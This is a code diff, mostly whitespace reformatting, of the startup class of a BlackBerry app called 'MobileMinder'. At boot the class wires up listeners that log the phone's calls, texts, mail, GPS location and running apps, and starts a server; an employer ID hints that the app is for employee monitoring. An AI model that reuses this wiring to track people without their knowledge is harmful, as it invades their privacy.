@@ -25,9 +25,9 @@ import net.rim.device.api.system.SystemListener;
 //class Controller extends Application
 public class Driver extends Application implements SystemListener
 {       // Enable logging
-                static Debug logWriter = Logger.getInstance();
+        static Debug logWriter = Logger.getInstance();
                 
-                LocalDataReader actLog ;//= LocalDataAccess.getLocalDataAccessRef();
+        LocalDataReader actLog ;//= LocalDataAccess.getLocalDataAccessRef();
                 
         //new way of creating the database
         //LocalDataFactory factory = createOsSpecificDBFactory();
@@ -40,9 +40,9 @@ public class Driver extends Application implements SystemListener
          */
         public static void main(String[] args)
         {
-                //How to create proper startup apps:
-                //http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/348583/800332/832062/How_To_-_Write_safe_initialization_code.html?nodeid=1487426&vernum=0
-                Driver appInstance = new Driver();
+            //How to create proper startup apps:
+            //http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/348583/800332/832062/How_To_-_Write_safe_initialization_code.html?nodeid=1487426&vernum=0
+            Driver appInstance = new Driver();
                 
                 
             // If system startup is still in progress when this
@@ -71,16 +71,17 @@ public class Driver extends Application implements SystemListener
 
     
     private void doStartupWorkLater()
-        {
-                invokeLater(new Runnable()
-                {
-        public void run()
-                        {
-                logWriter.log("Doing startup work now...");
-            doStartupWork();
-                        }
-                });
-        }
+    {
+    	invokeLater(new Runnable()
+    	{
+    		public void run()
+    		{
+    			logWriter.log("Doing startup work now...");
+    			doStartupWork();
+    		}
+                        
+    	});
+    }
     
     private void doStartupWork()
     {
@@ -88,24 +89,24 @@ public class Driver extends Application implements SystemListener
         logWriter.log("MobileMinder::Driver->Start...");
         
         // For future "Registration" feature 
-        int employerID  = 1;
-        int deviceID    = 2;
+        //int employerID  = 1;
+        //int deviceID    = 2;
         
         //Create variables
         int oneSec        = 1000;
-        int uploadTimer =  1*oneSec;//send update every
+        //int uploadTimer =  1*oneSec;//send update every
         int GPSTimer    = 15*oneSec;//check GPS every
         int AppTimer    =  2*oneSec;//check running app every
         
         // Load sub-components
         // What type should actLog be?
-       // new MyServerUpload(actLog, employerID, deviceID, uploadTimer);
+        // new MyServerUpload(actLog, employerID, deviceID, uploadTimer);
         new MyCallListener(actLog);
-            new MyTextListener(actLog);
-            new MyMailListener(actLog);
-            new MyGPSListener (actLog, GPSTimer);
-            new MyAppListener (actLog, AppTimer);            
-            new Server(actLog);
+        new MyTextListener(actLog);
+        new MyMailListener(actLog);
+        new MyGPSListener (actLog, GPSTimer);
+        new MyAppListener (actLog, AppTimer);            
+        new Server(actLog);
         
         
         /*synchronized(Application.getEventLock()){    UiEngine ui = Ui.getUiEngine();
@@ -117,38 +118,37 @@ public class Driver extends Application implements SystemListener
     }
     
 
-        public void powerUp()
-        {
-        logWriter.log("Power up...");
+    public void powerUp()
+    {
+    logWriter.log("Power up...");
 
-        removeSystemListener(this);
-        doStartupWork();                
-        }
+    removeSystemListener(this);
+    doStartupWork();                
+    }
+
+    public void batteryGood() 
+    {
+        // TODO Auto-generated method stub
+    	logWriter.log("Battery Good...");
+    }
     
-        public void batteryGood() 
-        {
-                // TODO Auto-generated method stub
-        logWriter.log("Battery Good...");
-        }
-        
-        public void batteryLow() 
-        {
-                // TODO Auto-generated method stub
-        logWriter.log("Battery Low...");
-        }
-        
-        public void batteryStatusChange(int arg0)
-        {
-                // TODO Auto-generated method stub
-        logWriter.log("BatteryStatusChange...");
-        }
-        
-        public void powerOff()
-        {
-                // TODO Auto-generated method stub
-        logWriter.log("Power off...");
-        }
-        
+    public void batteryLow() 
+    {
+        // TODO Auto-generated method stub
+    	logWriter.log("Battery Low...");
+    }
+    
+    public void batteryStatusChange(int arg0)
+    {
+        // TODO Auto-generated method stub
+    	logWriter.log("BatteryStatusChange...");
+    }
+    
+    public void powerOff()
+    {
+        // TODO Auto-generated method stub
+    	logWriter.log("Power off...");
+    }
 }
 
 /*
